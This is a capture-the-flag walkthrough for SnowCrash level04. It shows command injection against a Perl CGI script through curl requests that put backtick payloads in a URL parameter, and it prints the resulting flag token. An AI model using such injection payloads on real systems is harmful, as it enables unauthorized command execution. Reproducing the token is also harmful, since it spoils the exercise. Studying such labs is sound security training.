# level04
_The ritual_ :
- `pwd`: `/home/user/level04`
- `id`: `uid=2004(level04) gid=2004(level04) groups=2004(level04),100(users)`
- `ls -la`:
```sh
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
-r-x------  1 level04 level04  675 Apr  3  2012 .profile
```
- `find / -user flag04 2> /dev/null`:
```sh
/var/www/level04
/var/www/level04/level04.pl
/rofs/var/www/level04
/rofs/var/www/level04/level04.pl
```

## 2 importants things :
- There is a `perl` script where I am `level04.pl` and here's the content :
```pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```
This script execute a `CGI` script with what we given in argument.
- This folder `/var/www/level04/` say a server is running and the file `level04.pl` is in it.

_What happend if I execute it ?_
```sh
level04@SnowCrash:~$ perl level04.pl
Content-type: text/html


level04@SnowCrash:~$
```
_Meh... logic... I can try to `curl` this address in comment `localhost:4747`._
```sh
level04@SnowCrash:~$ curl http://localhost:4747

level04@SnowCrash:~$
```
## WHAT DOES THE SCRIPT DO ?
- `# localhost:4747 ` : the address of the server.
- `use CGI qw{param};` : import the function `param` from the module `CGI`
- `print "Content-type: text/html\n\n";` : Sends the HTTP header indicating that the content is HTML for the `CGI` script.
- `sub x` : declaration of the `x` function.
- `$y = $_[0];` : the variable `y` take the first argument as value.
- ``print `echo $y 2>&1`;`` : execute the command `echo` with the first argument.
- `x(param("x"));` : launch the function `x` with the function `param` as parameter, and `param` take `x` as variable to take the argument.

### Conclusion
- if I `curl` this address `http://localhost:4747/?x=Hello"` :
```sh
level04@SnowCrash:~$ curl http://localhost:4747/?x=Hello
Hello
level04@SnowCrash:~$
```
I have the output of the command `echo` in the script.

**_LET'S GET THE FLAG_**
```sh
level04@SnowCrash:~$ curl http://localhost:4747/?x=getflag
getflag
level04@SnowCrash:~$
```
_Yes it print `getflag`... BUT if I put a semi-colon `;`?_
```sh
level04@SnowCrash:~$ curl http://localhost:4747/?x=; getflag

Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)
level04@SnowCrash:~$
```
- Adding a `;` says to the shell another command has to be executed, and I can execute what I want to execute after the ``print `echo $y 2>&1`;`` : it's called **CODE INJECTION**

_If I use getflag in my terminal ?_
```sh
level04@SnowCrash:~$ getflag
Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)
level04@SnowCrash:~$
```
**A thing has to be known** : when I pass `getflag` in argument, the command is executed in the client-side :
```sh
level04@SnowCrash:~$ curl http://localhost:4747/?x=; pwd

/home/user/level04
level04@SnowCrash:~$
```

**BUT we can execute it directly on the server-side** and show to the client  :
```sh
level04@SnowCrash:~$ curl http://localhost:4747/?x=\`pwd\`
/var/www/level04
level04@SnowCrash:~$
```
_Okay, now I know that, what can I execute in the server-side ?..._
```sh
level04@SnowCrash:~$ curl http://localhost:4747/?x=\`getflag\`
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
level04@SnowCrash:~$
```
## LEZGOOOOOOO

<u>Explenations</u> : the server has more permission than the user `level04` and can execute the command `getflag`.

- Let's login to `level04` directly :
```sh
level04@SnowCrash:~$ su level05
Password:
level05@SnowCrash:~$
```
# level04 complet !
![yeah](../../assets/yeah.gif)